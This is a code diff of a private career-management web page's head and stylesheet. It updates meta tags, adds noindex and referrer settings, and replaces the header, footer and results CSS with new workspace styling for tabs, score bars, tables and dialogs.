@@ -3,25 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Career Automation | Alvin M. Silva, MDM — Opportunity Scanner & Document Generator</title>
-<meta name="description" content="AI-powered career document automation for Alvin M. Silva, MDM. Paste a job posting, get scored alignment analysis, recommended CV, and tailored cover letter.">
+<title>Career Intelligence &amp; Opportunity Management | Alvin M. Silva, MDM</title>
+<meta name="description" content="Private career workspace for Alvin M. Silva, MDM: explainable opportunity assessment, eligibility checks, evidence-backed documents, application pipeline, development roadmap and career analytics.">
 <meta name="author" content="Alvin M. Silva, MDM">
-<!-- SECURITY/PRIVACY FIX (audit 2026-08-04): this page contains Alvin's
-     salary-expectation and availability text and is a personal productivity
-     tool, not a public marketing page. It was neither in sitemap.xml nor
-     internally linked, but explicitly told crawlers to index it anyway.
-     noindex closes that gap without changing how the tool works. -->
+<!-- Private productivity tool, not a public marketing page: keep it out of
+     search indexes. Private records live in this browser (or the optional
+     private backend), never in the page or the service-worker cache. -->
 <meta name="robots" content="noindex, nofollow">
+<meta name="referrer" content="strict-origin-when-cross-origin">
 <link rel="canonical" href="https://alvin-silva.asilvainnovations.com/career-automation">
 <meta name="theme-color" content="#0a0e27">
 <link rel="icon" type="image/png" sizes="32x32" href="assets/logo-32.png">
 <link rel="apple-touch-icon" href="assets/logo-180.png">
 <link rel="manifest" href="manifest.webmanifest">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://alvin-silva.asilvainnovations.com/career-automation">
-<meta property="og:title" content="Career Automation | Alvin M. Silva, MDM">
-<meta property="og:description" content="Opportunity scanner and document generator — scored alignment, recommended CV, tailored cover letter.">
-<meta property="og:image" content="https://alvin-silva.asilvainnovations.com/assets/og-image.jpg">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&family=Poppins:wght@300;400;500;600&family=Roboto+Condensed:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
@@ -143,173 +137,173 @@ button{font-family:inherit}
 .btn-ghost:hover{background:var(--pill-bg-hover);transform:translateY(-2px)}
 .btn-sm{padding:.5rem 1.05rem;font-size:.8rem;min-height:40px}
 
-.theme-toggle{display:inline-flex;align-items:center;justify-content:center;gap:.4rem;cursor:pointer;width:44px;height:44px;border-radius:50%;border:1px solid var(--line);background:var(--pill-bg);color:var(--text);flex:none;transition:.25s}
-.theme-toggle:hover{border-color:var(--gold);transform:translateY(-2px)}
-.theme-toggle svg{width:19px;height:19px}
-.theme-toggle .icon-moon{display:block}
-.theme-toggle .icon-sun{display:none}
-html[data-theme="light"] .theme-toggle .icon-moon{display:none}
-html[data-theme="light"] .theme-toggle .icon-sun{display:block}
-
-/* Header */
-.site-header{position:sticky;top:0;z-index:1000;background:var(--header-bg);backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);border-bottom:1px solid var(--header-border);box-shadow:0 8px 30px rgba(0,0,0,.2)}
-.nav{display:flex;align-items:center;justify-content:space-between;gap:1rem;padding:.8rem clamp(1rem,4vw,2.5rem);max-width:1400px;margin:0 auto}
-.brand{display:flex;align-items:center;gap:.75rem;text-decoration:none;min-width:0}
-.brand img{width:46px;height:46px;border-radius:50%;border:2px solid var(--gold);background:#fff;padding:2px;flex:none}
-.brand-name{font-family:var(--font-display);font-weight:800;font-size:1.02rem;letter-spacing:.03em;background:linear-gradient(45deg,var(--sky),var(--blue),var(--gold));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;white-space:nowrap}
-.brand-sub{font-family:var(--font-cond);font-size:.64rem;letter-spacing:.14em;text-transform:uppercase;color:var(--text-3);white-space:nowrap}
-.nav-links{display:none;list-style:none;align-items:center;gap:.35rem}
-.nav-links>li>a,.drop-btn{font-family:var(--font-cond);font-size:.92rem;font-weight:600;letter-spacing:.06em;color:var(--text);text-decoration:none;padding:.55rem .85rem;border-radius:8px;display:inline-flex;align-items:center;gap:.4rem;background:none;border:1px solid transparent;cursor:pointer;transition:.25s}
-.nav-links a:hover,.drop-btn:hover,.drop.open .drop-btn{color:var(--gold);background:rgba(255,215,0,.08)}
-.nav-links a[aria-current="page"]{color:var(--gold);background:rgba(255,215,0,.10)}
-.drop{position:relative}
-.drop-btn .chev{width:10px;height:10px;border-right:2px solid currentColor;border-bottom:2px solid currentColor;transform:rotate(45deg) translateY(-2px);transition:transform .3s}
-.drop.open .drop-btn .chev{transform:rotate(225deg) translateY(-1px)}
-.drop-menu{position:absolute;top:calc(100% + .6rem);left:50%;transform:translate(-50%,-8px);min-width:250px;padding:.6rem;border-radius:14px;opacity:0;visibility:hidden;transition:.28s var(--ease);background:var(--mobile-menu-bg);border:1px solid var(--line-gold);box-shadow:0 20px 50px rgba(0,0,0,.35);z-index:1001}
-.drop.open .drop-menu{opacity:1;visibility:visible;transform:translate(-50%,0)}
-.drop-head{font-family:var(--font-cond);font-size:.66rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--text-3);padding:.45rem .8rem .55rem;border-bottom:1px solid var(--line);margin-bottom:.4rem}
-.drop-item{display:flex;align-items:center;gap:.7rem;padding:.6rem .8rem;border-radius:9px;color:var(--text);text-decoration:none;font-size:.9rem;transition:.2s}
-.drop-item svg{width:16px;height:16px;color:var(--sky);flex:none}
-.drop-item:hover{background:rgba(255,215,0,.12);color:var(--gold)}
-.nav-cta{display:none;align-items:center;gap:.6rem}
-.menu-btn{display:inline-flex;flex-direction:column;gap:5px;background:none;border:none;cursor:pointer;padding:.55rem;z-index:1102}
-.menu-btn span{width:24px;height:2.5px;background:var(--text);border-radius:2px;transition:.3s}
-.menu-btn[aria-expanded="true"] span:nth-child(1){transform:rotate(45deg) translate(5px,5px)}
-.menu-btn[aria-expanded="true"] span:nth-child(2){opacity:0}
-.menu-btn[aria-expanded="true"] span:nth-child(3){transform:rotate(-45deg) translate(6px,-6px)}
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1098;opacity:0;visibility:hidden;transition:.3s}
-.overlay.show{opacity:1;visibility:visible}
-.mobile-menu{position:fixed;top:0;right:-105%;width:min(84vw,340px);height:100dvh;z-index:1099;background:var(--mobile-menu-bg);border-left:1px solid var(--line);padding:1.4rem;transition:right .35s var(--ease);overflow-y:auto}
-.mobile-menu.open{right:0}
-.mobile-menu .mm-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.4rem}
-.mobile-menu .mm-head img{width:52px;height:52px;border-radius:50%;border:2px solid var(--gold)}
-.mm-close{background:none;border:none;color:var(--text);font-size:1.6rem;cursor:pointer;padding:.4rem;line-height:1}
-.mm-group{margin-bottom:1.1rem}
-.mm-group-title{font-family:var(--font-cond);font-size:.68rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--text-3);margin-bottom:.5rem;padding-left:.2rem}
-.mm-link{display:flex;align-items:center;gap:.7rem;padding:.68rem .6rem;color:var(--text);text-decoration:none;font-size:1rem;border-radius:9px}
-.mm-link svg{width:16px;height:16px;color:var(--sky)}
-.mm-link:active,.mm-link:hover,.mm-link[aria-current="page"]{background:var(--pill-bg);color:var(--gold)}
-
-@media(min-width:900px){.nav-links{display:flex}.nav-cta{display:flex}.menu-btn{display:none}}
-
-/* Footer */
-.site-footer{background:var(--footer-bg);border-top:1px solid var(--footer-border);padding:3.2rem 0 1.6rem;margin-top:2rem}
-.footer-grid{display:grid;gap:2rem;margin-bottom:2.2rem}
-.footer-brand p{font-size:.86rem;font-weight:300;color:var(--text-3);line-height:1.7;margin-top:.8rem;max-width:340px}
-.footer-col h4{font-family:var(--font-cond);font-size:.74rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--gold);margin-bottom:.9rem}
-.footer-col ul{list-style:none}
-.footer-col li{margin-bottom:.45rem}
-.footer-col a{color:var(--text-3);text-decoration:none;font-size:.88rem;transition:.2s}
-.footer-col a:hover{color:var(--sky);padding-left:4px}
-.socials{display:flex;gap:.7rem;margin-top:1.1rem}
-.socials a{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--blue),var(--sky));transition:transform .3s var(--ease),box-shadow .3s}
-.socials a svg{width:18px;height:18px;fill:#fff}
-.socials a:hover{transform:translateY(-4px) rotate(8deg);box-shadow:0 10px 24px rgba(0,191,255,.45)}
-.footer-base{border-top:1px solid var(--divider);padding-top:1.4rem;display:flex;flex-direction:column;gap:.8rem;align-items:center;text-align:center}
-.footer-base p{font-size:.8rem;color:var(--text-3);font-weight:300}
-@media(min-width:900px){.footer-grid{grid-template-columns:1.4fr 1fr 1fr 1fr}.footer-base{flex-direction:row;justify-content:space-between}}
-
 /* ============================================================
-   PAGE-SPECIFIC: Career Automation
+   CIOMS WORKSPACE
    ============================================================ */
+.sr-only{position:absolute!important;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+.ws-hero{background:#0a0e27;color:#fff;position:relative;overflow:hidden}
+.ws-hero::after{content:'';position:absolute;inset:0;background:radial-gradient(900px 380px at 85% -10%,rgba(0,102,255,.32),transparent 60%),radial-gradient(700px 300px at -5% 110%,rgba(255,215,0,.12),transparent 60%);pointer-events:none}
+.ws-hero-inner{position:relative;z-index:1;padding:clamp(2.6rem,7vw,4.2rem) 0 clamp(1.6rem,4vw,2.4rem)}
+.ws-crumb{display:inline-flex;align-items:center;gap:.45rem;font-family:var(--font-cond);font-size:.76rem;letter-spacing:.1em;text-transform:uppercase;color:rgba(255,255,255,.6);text-decoration:none;margin-bottom:.9rem}
+.ws-crumb:hover{color:#FFD700}
+.ws-crumb svg{width:13px;height:13px}
+.ws-hero .kicker{justify-content:flex-start;color:#4db8ff}
+.ws-hero .kicker::before{display:none}
+.ws-hero h1{font-size:clamp(1.7rem,5vw,2.7rem);font-weight:900;margin-bottom:.6rem;color:#fff}
+.ws-hero h1 .grad-text{background:linear-gradient(92deg,#4db8ff 0%,#5c8aff 45%,#FFD700 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.ws-hero p{color:rgba(255,255,255,.8);max-width:820px;font-weight:300}
+.ws-status{display:flex;flex-wrap:wrap;gap:.5rem;margin-top:1.1rem}
+.ws-chip{display:inline-flex;align-items:center;gap:.4rem;padding:.3rem .75rem;border-radius:999px;font-family:var(--font-cond);font-size:.74rem;font-weight:600;letter-spacing:.04em;border:1px solid rgba(255,255,255,.22);background:rgba(255,255,255,.06);color:rgba(255,255,255,.9)}
+.ws-chip::before{content:'';width:7px;height:7px;border-radius:50%;background:currentColor;opacity:.85}
+.ws-chip.ok{color:#34D399;border-color:rgba(52,211,153,.5)}
+.ws-chip.warn{color:#FFD700;border-color:rgba(255,215,0,.5)}
+.ws-chip.bad{color:#F87171;border-color:rgba(248,113,113,.55)}
+.ws-chip.info{color:#4db8ff;border-color:rgba(77,184,255,.5)}
 
-/* Hero */
-.ca-hero{background:#0a0e27;position:relative;overflow:hidden}
-.ca-hero-banner{position:absolute;inset:0;z-index:0}
-.ca-hero-banner::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(10,14,39,.55) 0%,rgba(10,14,39,.78) 60%,rgba(10,14,39,.98) 100%)}
-.ca-hero-inner{position:relative;z-index:2;text-align:center;padding:clamp(5rem,12vw,8rem) 1rem clamp(3.5rem,7vw,5rem)}
-.ca-hero h1{color:#fff;font-size:clamp(2rem,6.5vw,3.4rem);font-weight:900;margin-bottom:.8rem}
-.ca-hero .grad-text{background:linear-gradient(92deg,#4db8ff 0%,#5c8aff 45%,#FFD700 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 2px 8px rgba(0,0,0,.45))}
-.ca-hero .hero-sub{color:rgba(255,255,255,.82);font-size:clamp(.98rem,2.6vw,1.12rem);font-weight:300;line-height:1.8;max-width:720px;margin:0 auto 1.6rem}
-.ca-hero .kicker{color:#4db8ff}
-.ca-hero .kicker::before,.ca-hero .kicker::after{background:linear-gradient(90deg,transparent,#4db8ff)}
+.ws-tabs-wrap{position:sticky;top:var(--shl-header-h,64px);z-index:50;background:var(--header-bg);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.ws-tabs{display:flex;gap:.25rem;overflow-x:auto;scrollbar-width:thin;padding:.45rem 0}
+.ws-tab{flex:none;display:inline-flex;align-items:center;gap:.4rem;padding:.55rem .9rem;border-radius:10px;border:1px solid transparent;background:none;color:var(--text-2);font-family:var(--font-cond);font-weight:600;font-size:.88rem;letter-spacing:.04em;cursor:pointer;min-height:42px}
+.ws-tab:hover{background:var(--pill-bg);color:var(--text)}
+.ws-tab[aria-selected="true"]{background:var(--pill-bg-hover);border-color:var(--line-gold);color:var(--gold)}
+.ws-tab .ws-count{font-family:var(--font-mono);font-size:.7rem;padding:.05rem .4rem;border-radius:999px;background:var(--pill-bg);color:var(--text-3)}
+.ws-panel{padding:clamp(1.6rem,4vw,2.6rem) 0 3rem}
+.ws-panel[hidden]{display:none}
+.ws-panel h2{font-size:clamp(1.3rem,3.4vw,1.75rem);font-weight:800;margin-bottom:.35rem}
+.ws-lead{color:var(--text-3);max-width:860px;margin-bottom:1.4rem;font-weight:300}
+.ws-card{border-radius:16px;padding:clamp(1.1rem,2.6vw,1.6rem);margin-bottom:1.1rem;background:var(--glass);border:1px solid var(--line);box-shadow:var(--shadow-1)}
+.ws-card h3{font-size:1.05rem;font-weight:700;margin-bottom:.8rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
+.ws-card h3 svg{width:18px;height:18px;color:var(--sky)}
+.ws-card h4,.ws-dialog h4{font-family:var(--font-cond);font-size:.76rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--gold);margin:1.1rem 0 .55rem}
+.ws-grid{display:grid;gap:1rem}
+.ws-grid.cols-2{grid-template-columns:repeat(auto-fit,minmax(min(100%,360px),1fr))}
+.ws-grid.cols-3{grid-template-columns:repeat(auto-fit,minmax(min(100%,240px),1fr))}
+.ws-grid.cols-4{grid-template-columns:repeat(auto-fit,minmax(min(100%,150px),1fr))}
+.ws-kpi{padding:1rem 1.1rem;border-radius:14px;border:1px solid var(--line);background:var(--card)}
+.ws-kpi strong{display:block;font-family:var(--font-display);font-size:2rem;font-weight:800;line-height:1.05;color:var(--sky)}
+.ws-kpi span{font-size:.8rem;color:var(--text-3)}
+.ws-kpi small{display:block;font-size:.72rem;color:var(--text-3);margin-top:.25rem}
+.ws-muted{color:var(--text-3);font-size:.86rem}
+.ws-small{font-size:.78rem;color:var(--text-3)}
+.ws-note{padding:.75rem .9rem;border-radius:10px;border-left:3px solid var(--sky);background:var(--pill-bg);font-size:.85rem;margin:.6rem 0}
+.ws-note.warn{border-color:var(--gold)}
+.ws-note.bad{border-color:var(--red)}
+.ws-note.ok{border-color:var(--green)}
 
-/* Input Card */
-.input-card{border-radius:18px;padding:clamp(1.5rem,4vw,2.5rem)}
-.form-label{display:block;font-family:var(--font-cond);font-size:.76rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--sky);margin-bottom:.5rem}
-.input-card textarea{width:100%;padding:1rem;border-radius:12px;border:1.5px solid var(--line);background:var(--input-bg);color:var(--text);font-family:var(--font-body);font-size:.95rem;line-height:1.7;resize:vertical;min-height:180px;transition:.25s}
-.input-card textarea:focus{outline:none;border-color:var(--gold);box-shadow:0 0 0 3px rgba(255,215,0,.18)}
-.input-card textarea::placeholder{color:var(--text-3)}
-.input-actions{display:flex;flex-wrap:wrap;gap:.6rem;margin-top:1.2rem}
+/* forms */
+.ws-label{display:block;font-family:var(--font-cond);font-size:.74rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--sky);margin-bottom:.35rem}
+.ws-input,.ws-select,.ws-textarea{width:100%;padding:.7rem .85rem;border-radius:10px;border:1.5px solid var(--line);background:var(--input-bg);color:var(--text);font-family:var(--font-body);font-size:.92rem;transition:border-color .2s,box-shadow .2s}
+.ws-textarea{line-height:1.65;resize:vertical;min-height:120px}
+.ws-input:focus,.ws-select:focus,.ws-textarea:focus{outline:none;border-color:var(--gold);box-shadow:0 0 0 3px rgba(255,215,0,.18)}
+.ws-field{margin-bottom:.85rem}
+.ws-row{display:flex;flex-wrap:wrap;gap:.6rem;align-items:center}
+.ws-row.end{justify-content:flex-end}
+.ws-row .grow{flex:1;min-width:200px}
+.ws-check{display:flex;align-items:flex-start;gap:.55rem;font-size:.88rem;cursor:pointer}
+.ws-check input{margin-top:.25rem;accent-color:var(--gold);width:16px;height:16px;flex:none}
+.btn[disabled]{opacity:.55;cursor:not-allowed;transform:none!important}
+.btn-danger{background:transparent;color:var(--red);border-color:var(--red)}
+.btn-danger:hover{background:var(--red);color:#fff}
 
-/* Results */
-.result-card{border-radius:18px;padding:clamp(1.4rem,3vw,2rem);margin-bottom:1.3rem;animation:fadeUp .5s var(--ease) both}
-@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
-.result-card h3{font-size:1.15rem;font-weight:700;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
-.result-card h3 svg{width:20px;height:20px;color:var(--sky);flex:none}
+/* chips & badges */
+.ws-badge{display:inline-flex;align-items:center;gap:.3rem;padding:.12rem .55rem;border-radius:999px;font-family:var(--font-cond);font-size:.7rem;font-weight:700;letter-spacing:.05em;border:1px solid var(--line);background:var(--pill-bg);color:var(--text-2);white-space:nowrap}
+.ws-badge.verified,.ws-badge.met,.ws-badge.high,.ws-badge.pursue{color:var(--green);border-color:var(--green)}
+.ws-badge.documented,.ws-badge.likely,.ws-badge.medium,.ws-badge.user{color:var(--sky);border-color:var(--sky)}
+.ws-badge.self-reported,.ws-badge.verify,.ws-badge.manual,.ws-badge.low,.ws-badge.unverified,.ws-badge.minor{color:var(--gold);border-color:var(--gold)}
+.ws-badge.inferred,.ws-badge.missing,.ws-badge.unknown{color:var(--text-3);border-style:dashed}
+.ws-badge.not,.ws-badge.expired,.ws-badge.blocking,.ws-badge.bad{color:var(--red);border-color:var(--red)}
+.ws-badge.major{color:#f59e0b;border-color:#f59e0b}
 
-/* Score Bar */
-.score-row{display:flex;align-items:center;gap:.8rem;padding:.55rem 0;border-bottom:1px solid var(--divider)}
-.score-row:last-child{border-bottom:none}
-.score-name{font-family:var(--font-cond);font-size:.85rem;font-weight:600;letter-spacing:.04em;color:var(--text);flex:1;min-width:140px}
-.score-bar{flex:2;height:10px;border-radius:999px;background:var(--pill-bg);overflow:hidden;position:relative}
-.score-fill{height:100%;border-radius:999px;transition:width .8s var(--ease);position:relative}
-.score-fill::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);animation:shimmer 2s infinite}
-@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
-.score-fill.high{background:linear-gradient(90deg,var(--green),#34D399)}
-.score-fill.medium{background:linear-gradient(90deg,var(--gold),#FFD700)}
-.score-fill.low{background:linear-gradient(90deg,var(--red),#F87171)}
-.score-num{font-family:var(--font-mono);font-size:.85rem;font-weight:700;color:var(--text-2);min-width:40px;text-align:right}
-.score-total{font-size:clamp(2.5rem,6vw,3.5rem);font-weight:800;text-align:center;background:linear-gradient(45deg,var(--gold),var(--sky));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1}
-.score-label{text-align:center;font-family:var(--font-cond);font-size:.82rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--text-3);margin-top:.3rem}
-.score-verdict{text-align:center;margin-top:1rem;padding:.6rem 1.2rem;border-radius:999px;font-family:var(--font-cond);font-size:.85rem;font-weight:700;letter-spacing:.04em;display:inline-block}
-.score-verdict.pursue{background:rgba(52,211,153,.12);border:1px solid var(--green);color:var(--green)}
-.score-verdict.conditional{background:rgba(255,215,0,.12);border:1px solid var(--gold);color:var(--gold)}
-.score-verdict.skip{background:rgba(248,113,113,.12);border:1px solid var(--red);color:var(--red)}
+/* scores */
+.ws-scores{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(min(100%,190px),1fr));margin:.4rem 0 1rem}
+.ws-score{padding:1rem;border-radius:14px;border:1px solid var(--line);background:var(--card);text-align:center}
+.ws-score .num{font-family:var(--font-display);font-size:2.4rem;font-weight:800;line-height:1}
+.ws-score .lbl{font-family:var(--font-cond);font-size:.76rem;letter-spacing:.1em;text-transform:uppercase;color:var(--text-3);margin-top:.3rem}
+.ws-score .sub{font-size:.76rem;color:var(--text-3);margin-top:.35rem}
+.tone-high{color:var(--green)}.tone-mid{color:var(--gold)}.tone-low{color:var(--red)}
+.ws-bar{display:grid;grid-template-columns:minmax(150px,1.1fr) 2fr 44px;gap:.7rem;align-items:center;padding:.42rem 0;border-bottom:1px solid var(--divider);font-size:.86rem}
+.ws-bar:last-child{border-bottom:none}
+.ws-bar .track{height:9px;border-radius:999px;background:var(--pill-bg);overflow:hidden}
+.ws-bar .fill{height:100%;border-radius:999px;background:linear-gradient(90deg,var(--blue),var(--sky))}
+.ws-bar .fill.tone-high{background:linear-gradient(90deg,var(--green),#34D399)}
+.ws-bar .fill.tone-mid{background:linear-gradient(90deg,var(--gold),#FFD700)}
+.ws-bar .fill.tone-low{background:linear-gradient(90deg,var(--red),#F87171)}
+.ws-bar .n{font-family:var(--font-mono);font-weight:700;text-align:right}
+.ws-bar .why{grid-column:1/-1;font-size:.75rem;color:var(--text-3);margin-top:-.2rem}
+.ws-decision{display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.1rem;border-radius:14px;border:2px solid var(--line-gold);background:linear-gradient(135deg,rgba(255,215,0,.08),transparent)}
+.ws-decision.pursue{border-color:var(--green);background:linear-gradient(135deg,rgba(52,211,153,.1),transparent)}
+.ws-decision.ineligible,.ws-decision.deprioritize,.ws-decision.closed{border-color:var(--red);background:linear-gradient(135deg,rgba(248,113,113,.1),transparent)}
+.ws-decision strong{font-family:var(--font-display);font-size:1.08rem}
+.ws-decision ul{margin:.45rem 0 0 1.1rem;font-size:.86rem}
 
-/* Gap Analysis */
-.gap-item{display:flex;align-items:flex-start;gap:.6rem;padding:.5rem 0;font-size:.88rem}
-.gap-item svg{width:16px;height:16px;flex:none;margin-top:.15rem}
-.gap-item.ok{color:var(--green)}
-.gap-item.warn{color:var(--gold)}
-.gap-item.fail{color:var(--red)}
+/* tables */
+.ws-table-wrap{overflow-x:auto;border-radius:12px;border:1px solid var(--line)}
+.ws-table{width:100%;border-collapse:collapse;font-size:.86rem}
+.ws-table th{font-family:var(--font-cond);font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--text-3);text-align:left;padding:.65rem .7rem;border-bottom:2px solid var(--line);background:var(--pill-bg);white-space:nowrap}
+.ws-table td{padding:.6rem .7rem;border-bottom:1px solid var(--divider);vertical-align:top}
+.ws-table tr:last-child td{border-bottom:none}
+.ws-table tbody tr:hover{background:var(--pill-bg)}
+.ws-table .num{font-family:var(--font-mono);font-weight:700;white-space:nowrap}
+.ws-table select{padding:.35rem .5rem;border-radius:8px;border:1px solid var(--line);background:var(--input-bg);color:var(--text);font-size:.8rem}
+.ws-link{background:none;border:none;color:var(--link);cursor:pointer;font:inherit;text-align:left;padding:0;text-decoration:underline;text-underline-offset:2px}
+.ws-empty{text-align:center;padding:2.4rem 1rem;color:var(--text-3)}
 
-/* CV Recommendation */
-.cv-rec{display:flex;align-items:center;gap:1rem;padding:1.2rem;border-radius:14px;border:2px solid var(--line-gold);background:linear-gradient(135deg,rgba(255,215,0,.08),rgba(26,31,58,.8));margin-bottom:1rem}
-.cv-rec-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:rgba(255,215,0,.12);border:1px solid var(--line-gold);flex:none}
-.cv-rec-icon svg{width:22px;height:22px;color:var(--gold)}
-.cv-rec-info{flex:1;min-width:0}
-.cv-rec-name{font-family:var(--font-display);font-weight:700;font-size:1rem;color:var(--text);margin-bottom:.15rem}
-.cv-rec-meta{font-size:.78rem;color:var(--text-3);font-weight:300}
+/* extracted fields */
+.ws-fields{display:grid;gap:.8rem;grid-template-columns:repeat(auto-fit,minmax(min(100%,230px),1fr))}
+.ws-fields .ws-field{margin:0;padding:.7rem;border-radius:12px;border:1px solid var(--line);background:var(--card)}
+.ws-fields .ws-label{display:flex;justify-content:space-between;gap:.4rem;align-items:center}
+.ws-req{display:grid;grid-template-columns:auto 1fr;gap:.25rem .6rem;padding:.45rem 0;border-bottom:1px dashed var(--divider);font-size:.84rem}
+.ws-req:last-child{border-bottom:none}
+.ws-req .tags{display:flex;gap:.25rem;flex-wrap:wrap;align-items:flex-start}
 
-/* Cover Letter */
-.cover-letter{border-radius:14px;padding:1.5rem;font-size:.9rem;line-height:1.75;color:var(--text);background:var(--input-bg);border:1.5px solid var(--line);white-space:pre-wrap;max-height:400px;overflow-y:auto}
+/* claims */
+.ws-claim{display:flex;gap:.6rem;padding:.55rem .6rem;border-radius:10px;border:1px solid var(--line);margin-bottom:.4rem;background:var(--card)}
+.ws-claim .meta{display:flex;gap:.35rem;flex-wrap:wrap;margin-top:.25rem}
+.ws-claim .warn{color:var(--gold);font-size:.76rem}
 
-/* Tracker */
-.tracker-table{width:100%;border-collapse:collapse;font-size:.88rem}
-.tracker-table th{font-family:var(--font-cond);font-size:.72rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--text-3);text-align:left;padding:.7rem .6rem;border-bottom:2px solid var(--line)}
-.tracker-table td{padding:.7rem .6rem;border-bottom:1px solid var(--divider);vertical-align:middle}
-.tracker-table tr:hover{background:var(--pill-bg-hover)}
-.tracker-score{font-family:var(--font-mono);font-weight:700;font-size:.85rem}
-.tracker-score.high{color:var(--green)}
-.tracker-score.medium{color:var(--gold)}
-.tracker-score.low{color:var(--red)}
-.tracker-status{padding:.25rem .7rem;border-radius:999px;font-family:var(--font-cond);font-size:.72rem;font-weight:600;letter-spacing:.04em;border:1px solid var(--line);background:var(--pill-bg);color:var(--text-2);cursor:pointer;transition:.2s}
-.tracker-status:hover{border-color:var(--gold);color:var(--gold)}
-.tracker-actions{display:flex;gap:.4rem}
-.tracker-actions button{width:32px;height:32px;border-radius:50%;border:1px solid var(--line);background:var(--pill-bg);color:var(--text);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:.9rem;transition:.2s}
-.tracker-actions button:hover{background:var(--red);color:#fff;border-color:var(--red)}
-.tracker-empty{text-align:center;padding:3rem 1rem;color:var(--text-3)}
-.tracker-empty svg{width:48px;height:48px;color:var(--text-3);margin-bottom:1rem;opacity:.5}
+/* steps */
+.ws-steps{display:grid;gap:.6rem;grid-template-columns:repeat(auto-fit,minmax(min(100%,150px),1fr));margin:.4rem 0 1.2rem;counter-reset:s}
+.ws-step{counter-increment:s;padding:.8rem;border-radius:12px;border:1px solid var(--line);background:var(--card);text-align:left;cursor:pointer;color:var(--text);font:inherit}
+.ws-step:hover{border-color:var(--gold)}
+.ws-step b{display:block;font-family:var(--font-display);font-size:.95rem}
+.ws-step b::before{content:counter(s) ". ";color:var(--gold)}
+.ws-step span{font-size:.76rem;color:var(--text-3)}
 
-/* Export */
-.export-bar{display:flex;flex-wrap:wrap;gap:.5rem;justify-content:center;margin-top:1.5rem}
+/* list */
+.ws-list{list-style:none}
+.ws-list li{display:flex;gap:.7rem;align-items:flex-start;justify-content:space-between;padding:.6rem 0;border-bottom:1px solid var(--divider);font-size:.88rem}
+.ws-list li:last-child{border-bottom:none}
 
-/* Responsive */
+/* dialog */
+.ws-dialog{border:none;padding:0;border-radius:18px;width:min(940px,96vw);max-height:92vh;background:var(--card);color:var(--text);box-shadow:var(--shadow-2)}
+.ws-dialog::backdrop{background:rgba(5,8,22,.66);backdrop-filter:blur(3px)}
+.ws-dialog-head{position:sticky;top:0;z-index:2;display:flex;justify-content:space-between;align-items:center;gap:1rem;padding:1rem 1.2rem;border-bottom:1px solid var(--line);background:var(--card)}
+.ws-dialog-head h3{font-size:1.05rem}
+.ws-dialog-body{padding:1.1rem 1.2rem 1.4rem}
+.ws-x{width:40px;height:40px;border-radius:50%;border:1px solid var(--line);background:var(--pill-bg);color:var(--text);cursor:pointer;font-size:1.2rem;line-height:1}
+.ws-timeline{list-style:none;border-left:2px solid var(--line);margin-left:.4rem;padding-left:1rem}
+.ws-timeline li{position:relative;padding:.25rem 0 .55rem;font-size:.84rem}
+.ws-timeline li::before{content:'';position:absolute;left:-1.42rem;top:.55rem;width:10px;height:10px;border-radius:50%;background:var(--sky)}
+
+/* toast */
+.ws-toasts{position:fixed;left:50%;bottom:calc(1rem + env(safe-area-inset-bottom));transform:translateX(-50%);z-index:12000;display:flex;flex-direction:column;gap:.5rem;align-items:center;pointer-events:none}
+.ws-toast{pointer-events:auto;max-width:min(560px,92vw);padding:.7rem 1rem;border-radius:12px;background:var(--card);color:var(--text);border:1px solid var(--line-gold);box-shadow:var(--shadow-2);font-size:.88rem;animation:wsIn .25s var(--ease)}
+.ws-toast.bad{border-color:var(--red)}
+@keyframes wsIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+@media (prefers-reduced-motion:reduce){.ws-toast{animation:none}}
+
 @media(max-width:640px){
-  .score-row{flex-direction:column;align-items:flex-start;gap:.3rem}
-  .score-bar{width:100%}
-  .cv-rec{flex-direction:column;align-items:flex-start}
-  .tracker-table{display:block;overflow-x:auto}
+  .ws-grid.cols-4{grid-template-columns:1fr 1fr}
+  .ws-kpi strong{font-size:1.6rem}
